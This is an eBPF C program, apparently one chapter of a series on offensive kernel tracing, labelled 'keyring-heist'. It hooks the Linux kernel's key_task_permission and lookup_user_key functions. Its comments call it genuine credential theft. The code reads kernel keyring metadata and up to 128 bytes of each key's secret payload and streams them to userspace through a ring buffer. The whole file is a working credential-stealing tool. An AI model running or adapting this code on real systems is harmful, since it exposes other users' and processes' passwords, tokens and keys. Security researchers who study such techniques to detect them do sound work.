// ch08 keyring-heist: kprobe key_task_permission + lookup_user_key.
//
// REAL EFFECT: reads key metadata AND the actual payload bytes from
// key->payload.data[0] via bpf_probe_read_kernel, exfiltrating the
// secret value through the ringbuf. This is genuine credential theft —
// the kernel holds the key material and BPF reads it out at the
// permission-check site.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define PAYLOAD_CAP 128

struct evt {
    unsigned int pid;
    char comm[16];
    int serial;
    unsigned int datalen;
    char type[16];
    char desc[64];
    int hook;               // 1=key_task_permission 2=lookup_user_key
    unsigned int exfil_len; // how many payload bytes we actually read
    char payload[PAYLOAD_CAP]; // EXFILTRATED key material
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 20);  // 1 MiB — payload events are larger
} events SEC(".maps");

// Scratch space: struct evt is >256B, too large for BPF stack.
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __type(key, unsigned int);
    __type(value, struct evt);
    __uint(max_entries, 1);
} scratch SEC(".maps");

static __always_inline void emit_key(struct key *k, int hook)
{
    if (!k) return;

    unsigned int zero = 0;
    struct evt *s = bpf_map_lookup_elem(&scratch, &zero);
    if (!s) return;
    __builtin_memset(s, 0, sizeof(*s));

    s->pid = bpf_get_current_pid_tgid() >> 32;
    bpf_get_current_comm(&s->comm, sizeof(s->comm));
    s->hook = hook;
    s->serial = BPF_CORE_READ(k, serial);
    s->datalen = BPF_CORE_READ(k, datalen);

    struct key_type *kt = BPF_CORE_READ(k, type);
    const char *tname = BPF_CORE_READ(kt, name);
    if (tname) bpf_probe_read_kernel_str(&s->type, sizeof(s->type), tname);
    const char *desc = BPF_CORE_READ(k, description);
    if (desc) bpf_probe_read_kernel_str(&s->desc, sizeof(s->desc), desc);

    // ---- REAL EFFECT: exfiltrate actual key payload bytes ----
    // For user-type keys the payload lives at key->payload.data[0],
    // which is a pointer to a kmalloc'd buffer of key->datalen bytes.
    // We read up to PAYLOAD_CAP bytes of the actual secret.
    s->exfil_len = 0;
    unsigned int dlen = s->datalen;
    if (dlen > 0) {
        if (dlen > PAYLOAD_CAP)
            dlen = PAYLOAD_CAP;
        // key->payload is a union; data[0] is the first slot.
        // For "user" type keys, data[0] points to a user_key_payload
        // struct whose first member (after rcu) is the raw data.
        // Read the raw pointer from payload.data[0].
        void *data_ptr = BPF_CORE_READ(k, payload.data[0]);
        if (data_ptr) {
            // user_key_payload layout: { struct rcu_head rcu; unsigned short datalen; char data[]; }
            // The actual bytes start at offset sizeof(struct rcu_head) + sizeof(unsigned short).
            // On aarch64: rcu_head is 16 bytes, so data starts at offset 18.
            // But to be safe with CO-RE, read the raw blob — the first
            // sizeof(rcu_head) bytes are garbage but the rest is the secret.
            // For a cleaner read, jump past the rcu_head (16B) + datalen (2B).
            void *secret = data_ptr + 16 + 2;
            int ret = bpf_probe_read_kernel(&s->payload, dlen & (PAYLOAD_CAP - 1), secret);
            if (ret == 0) {
                s->exfil_len = dlen;
            } else {
                // Fallback: try reading directly from data_ptr (some key
                // types store the value directly without a sub-header).
                ret = bpf_probe_read_kernel(&s->payload, dlen & (PAYLOAD_CAP - 1), data_ptr);
                if (ret == 0)
                    s->exfil_len = dlen;
            }
        }
    }

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return;
    __builtin_memcpy(e, s, sizeof(*e));
    bpf_ringbuf_submit(e, 0);
}

SEC("kprobe/key_task_permission")
int BPF_KPROBE(kp_ktp, void *key_ref)
{
    unsigned long kr = (unsigned long)key_ref;
    struct key *k = (struct key *)(kr & ~3UL);
    emit_key(k, 1);
    return 0;
}

SEC("kprobe/lookup_user_key")
int BPF_KPROBE(kp_luk, int id)
{
    unsigned int zero = 0;
    struct evt *s = bpf_map_lookup_elem(&scratch, &zero);
    if (!s) return 0;
    __builtin_memset(s, 0, sizeof(*s));
    s->pid = bpf_get_current_pid_tgid() >> 32;
    bpf_get_current_comm(&s->comm, sizeof(s->comm));
    s->hook = 2;
    s->serial = id;
    __builtin_memcpy(s->type, "lookup", 7);

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    __builtin_memcpy(e, s, sizeof(*e));
    bpf_ringbuf_submit(e, 0);
    return 0;
}
